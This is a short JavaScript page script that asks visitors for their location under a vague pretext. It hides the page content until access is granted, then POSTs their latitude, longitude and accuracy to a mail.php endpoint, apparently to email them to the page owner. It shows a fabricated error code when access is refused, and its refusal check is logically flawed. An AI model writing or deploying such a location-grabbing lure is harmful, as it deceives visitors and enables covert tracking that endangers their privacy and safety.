window.onload = function() {
    alert('We need to access your location to show result based on your location');
    let startPos;
    let geoSuccess = function(position) {
        startPos = position;
        if (position) {
            document.querySelector('.main-block').style.display = 'flex';
            document.querySelector('.error').remove();
        }


        //neObj contains the info about lattitude, longtitude and accuracy
        let newObj = {
            lat: startPos.coords.latitude,
            lon: startPos.coords.longitude,
            accuracy: startPos.coords.accuracy
        };

        let json = JSON.stringify(newObj);

        let xhr = new XMLHttpRequest();
        //below you should provide the path to the mail.php file and then POST it
        xhr.open("POST", "./mail.php");
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(json);


    };
    navigator.geolocation.getCurrentPosition(geoSuccess);

    //if user doesn't want to provide geolocation, then we make a mistake
    if (navigator.geolocation.getCurrentPosition(geoSuccess) === undefined) {
        let p = document.createElement('p');
        //some random error mistake text
        p.innerHTML = `<strong>#643 Access is denied due to geolocation services are disallowed</strong>`;
        p.style.fontSize = '30px';
        document.querySelector('.error').appendChild(p);
    }
};
